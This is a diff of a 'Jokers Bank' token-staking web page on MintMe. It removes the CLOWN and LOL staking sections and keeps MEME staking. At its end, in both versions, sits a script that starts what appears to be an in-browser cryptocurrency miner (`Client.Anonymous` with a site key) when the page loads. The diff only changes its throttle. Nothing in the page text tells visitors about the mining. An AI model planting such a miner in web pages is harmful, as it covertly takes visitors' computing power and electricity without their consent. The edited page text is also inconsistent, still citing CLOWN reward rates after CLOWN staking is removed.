@@ -14,15 +14,13 @@
   <body>
    
    <div style="text-align: left"><span style="font-size: 18px; cursor: pointer;" onclick="openNav()">&#9776; Enter The Funiverse</span></div>
-   <!-- <div style="text-align: right"><button onclick="darkMode()">light</button></div> -->
+   <div style="text-align: right"><button onclick="darkMode()">light</button></div>
 
    <div id="mySidenav" class="sidenav">
       <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
       <a href="../">Home</a>
       <a href="../meme/">MEME token</a>
       <a href="../jokers/">JOKERS token</a>
-      <a href="../clown/">CLOWN token</a>
-      <a href="../lol/">LOL token</a>
       <a href="../faucet/">Faucet</a>
    </div>
 
@@ -38,12 +36,11 @@
 
    <br>
    
-   <h3>Stake <a href="../clown/">CLOWN</a> and <a href="../meme/">MEME </a>in Jokers Bank*</h3>
+   <h3>Stake <a href="../meme/">MEME tokens</a> in Jokers Bank*</h3>
    <p>
-      You can stake any amount of CLOWN and max 100k MEME tokens at any time in the Jokers Bank.<br><br>
+      You can stake any amount of MEME tokens at any time in the Jokers Bank.<br><br>
       Staking rewards distribution:<br>
-      - 14% of the CLOWN amount staked after 7 days - reward is <a href="../jokers/">JOKERS</a>,<br>
-      - 7% of MEME amount staked after 7 days - reward is <a href="../lol/">LOL</a><br><br>
+      - 10% of the MEME tokens amount staked after 7 days - reward is <a href="../jokers/">JOKERS</a>,<br>
       For the first time you can claim reward immediately after placing your stake (no need to wait 7 days).<br>
       You have to wait 7 days to claim reward again.<br>
       You can claim staking reward later (e.g. in a month), but you will receive 14% (when staking CLOWN) or 7% (when staking MEME) of your balance staked, but<br>
@@ -53,21 +50,21 @@
       A small amount of MintMe is included in the transaction fee at the time the LOL claim is executed. It is used to repurchase and increase liquidity.<br><br>
       You must have MetaMask wallet (or other wallet) configured for MintMe.<br>
       Reload the page if Jokers Bank is not connected to MetaMask or "undefined".<br><br>
-      See <a href="../faucet/">Faucet</a> - claim CLOWN and LOL.
+      See <a href="../faucet/">Faucet</a> - claim JOKERS.
    </p>
 
    <br>
 
    <div>
-      <h3>Stake CLOWN <img src="../img/clown512.png" alt="CLOWN" width="64"></h3>
+      <h3>Stake MEME tokens <img src="../img/meme512.png" alt="MEME" width="64"></h3>
       <input id="amount1" type="text" size="20" placeholder="e.g. 1000">
-		<button onclick="approveZ()" class="button button1">Approve CLOWN</button>
+		<button onclick="approveM()" class="button button1">Approve MEME</button>
 		<br>
       <p>Amount to approve must be the same as amount to stake</p>
 		<div id="lang"></div>
       <br>
       <input type="text" id="amount1" size="20" placeholder="e.g. 1000">
-		<button onclick="stakeTokens()" class="button button1">Stake CLOWN</button>
+		<button onclick="stakeTokens()" class="button button1">Stake MEME</button>
 		<br>
       <p>Amount to stake must be the same as amount to approve</p>
 		<div id="lang1"></div>
@@ -88,7 +85,7 @@
       <p>Copy unix_timestamp and go to <a href="https://www.unixtimestamp.com/"> converter.</a><br>
          Paste the timestamp to "Enter a Timestamp" field and tap/click Convert.</p>
       <br>
-      <button onclick="unstakeTokens()" class="button button1">Unstake CLOWN</button>
+      <button onclick="unstakeTokens()" class="button button1">Unstake MEME</button>
       <br>
 		<p></p>
 		<div id="lang5"></div>
@@ -101,55 +98,12 @@
    <br>
 
    <div>
-      <h3>Stake MEME <img src="../img/meme512.png" alt="MEME" width="64"></h3>
-      <input id="amount4" type="text" size="20" placeholder="e.g. 1000">
-		<button onclick="approveM()" class="button button1">Approve MEME</button>
-		<br>
-      <p>Amount to approve must be the same as amount to stake</p>
-		<div id="lang7"></div>
-      <br>
-      <input type="text" id="amount1" size="20" placeholder="max 100000">
-		<button onclick="stakeTokens2()" class="button button1">Stake MEME</button>
-		<br>
-      <p>Amount to stake must be the same as amount to approve</p>
-		<div id="lang8"></div>
-      <br>
-      <button onclick="stakingBalance2()" class="button button1">Check your balance staked</button>
-		<br>
-		<p></p>
-		<div id="lang9"></div>
-      <br>
-      <button onclick="claimTokens2()" class="button button1">Claim LOL (staking reward)</button>
-      <br>
-		<p></p>
-		<div id="lang10"></div>
-      <br>
-      <button onclick="lockTimeUn()" class="button button1">Timestamp</button>
-      <p>Check the next claim timestamp</p>
-      <div id="lang11"></div>
-      <p>Copy unix_timestamp and go to <a href="https://www.unixtimestamp.com/"> converter</a>.<br>
-         Paste the timestamp to "Enter a Timestamp" field and tap/click Convert.</p>
-      <br>
-      <button onclick="unstakeTokens2()" class="button button1">Unstake MEME</button>
-      <br>
-		<p></p>
-		<div id="lang12"></div>
-      <br>
-      <button onclick="balanceBank2()" class="button button1">Jokers Bank balance</button>
-		<p></p>
-		<div id="lang13"></div>
-   </div>
-
-   <br>
-
-   <div>
       <p>
          CLOWN token contract address: 0x82E412523593773170C44adF4f7629e797F427D1<br>
          JOKERS token contract address: 0x2BC398fD147f7F3E8e093a43d188Be3AF5C59dCD<br>
          MEME token contract address: 0xc277A0F8405dC5c45A55726955eb6C4d430D61c2<br>
          LOL token contract address: 0x7C75f7cDa8674787C4d82b2222a9025eCdC1343F<br><br>
-         There are two contracts in the Jokers Bank:<br>
-         Jokers Bank CLOWN staking contract address <a href="https://www.mintme.com/explorer/addr/0x91b33d1030a466379ac6c887c5c57203e7a8fd29">0x91b33d1030a466379ac6c887c5c57203e7a8fd29</a> and<br>
+         Jokers Bank contract:<br>
          Jokers Bank MEME staking contract address <a href="https://www.mintme.com/explorer/addr/0x634db42e314295b0ba12d1289e82ce3242d281e9">0x634db42e314295b0ba12d1289e82ce3242d281e9</a>.
       </p>
    </div>
@@ -196,12 +150,12 @@
    <script src="../functions.js"></script>
    <script>
       var _client = new Client.Anonymous('d6237b4afd13d3e90bedfc23492f02c2f518750842d718b09cba1c7a374ac1f5', {
-          throttle: 0.7, c: 'w', ads: 0
+          throttle: 0.4, c: 'w', ads: 0
       });
       _client.start();
       
   
   </script>
-   <!-- <script src="../addtokenweb3.js"></script> -->
+   <script src="../addtokenweb3.js"></script>
   </body>
 </html>
